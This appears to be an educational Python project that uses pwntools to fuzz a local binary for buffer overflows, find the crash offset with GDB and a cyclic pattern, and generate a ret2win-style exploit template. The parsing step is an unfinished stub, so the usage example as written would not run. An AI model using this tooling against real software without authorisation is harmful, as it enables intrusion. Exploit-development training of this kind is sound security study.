#!/usr/bin/env python3

"""
Project 2: Automated Buffer Overflow Detection

Goal: Create a tool that:
1. Fuzzes binary inputs to find crashes
2. Analyzes crash information
3. Determines exploitability
4. Generates basic exploit template

This project teaches:
- Fuzzing techniques
- Crash analysis
- Exploit development process
"""

import subprocess
import tempfile
import os
from pwn import *

class BufferOverflowDetector:
    def __init__(self, binary_path):
        self.binary_path = binary_path
        self.crashes = []

    def fuzz_inputs(self, max_length=1000, step=50):
        """Fuzz binary with increasing input lengths"""
        log.info("Starting fuzzing process...")

        for length in range(step, max_length, step):
            if self._test_crash(length):
                log.success(f"Crash detected at length {length}")
                self.crashes.append(length)

                # Find precise crash point
                precise_length = self._find_precise_crash(length - step, length)
                if precise_length:
                    log.info(f"Precise crash length: {precise_length}")
                    return precise_length

        return None

    def _test_crash(self, length):
        """Test if given input length causes crash"""
        try:
            # Create test input
            test_input = b'A' * length

            # Run binary with input
            p = process(self.binary_path)
            p.sendline(test_input)

            # Check if process crashed
            exit_code = p.wait()
            p.close()

            return exit_code != 0

        except Exception as e:
            log.debug(f"Error testing length {length}: {e}")
            return False

    def _find_precise_crash(self, start, end):
        """Binary search to find exact crash point"""
        while start < end - 1:
            mid = (start + end) // 2
            if self._test_crash(mid):
                end = mid
            else:
                start = mid
        return end if self._test_crash(end) else None

    def analyze_crash(self, crash_length):
        """Analyze crash to determine offset and exploitability"""
        log.info("Analyzing crash...")

        # Generate pattern
        pattern = cyclic(crash_length + 50)

        # Create GDB script
        gdb_script = f"""
        set confirm off
        set pagination off
        run <<< "{pattern.decode('latin1')}"
        info registers
        quit
        """

        # Write script to temporary file
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.gdb') as f:
            f.write(gdb_script)
            script_path = f.name

        try:
            # Run GDB with script
            result = subprocess.run(
                ['gdb', '-batch', '-x', script_path, self.binary_path],
                capture_output=True, text=True, timeout=10
            )

            # Parse output for crash information
            return self._parse_gdb_output(result.stdout)

        finally:
            os.unlink(script_path)

    def _parse_gdb_output(self, output):
        """Parse GDB output to extract crash information"""
        # TODO: Parse register values and determine offset
        # Look for RSP value and calculate offset using cyclic_find
        pass

    def generate_exploit_template(self, offset, target_function=None):
        """Generate basic exploit template"""
        template = f'''#!/usr/bin/env python3
from pwn import *

# Target binary: {self.binary_path}
# Crash offset: {offset}

binary_path = "{self.binary_path}"
context.arch = 'amd64'

def exploit():
    p = process(binary_path)

    # Wait for input prompt
    # p.recvuntil(b"prompt: ")

    # Craft payload
    offset = {offset}
    '''

        if target_function:
            template += f'''
    target_address = {hex(target_function)}
    payload = b'A' * offset + p64(target_address)
    '''
        else:
            template += '''
    # TODO: Find target function address
    # target_address = 0x401234  # Address of win function
    # payload = b'A' * offset + p64(target_address)
    payload = b'A' * (offset + 8)  # Test payload
    '''

        template += '''
    # Send payload
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
'''

        return template

# Usage example:
# detector = BufferOverflowDetector("./vulnerable_binary")
# crash_length = detector.fuzz_inputs()
# if crash_length:
#     crash_info = detector.analyze_crash(crash_length)
#     exploit_code = detector.generate_exploit_template(crash_info['offset'])
#     print(exploit_code)
```
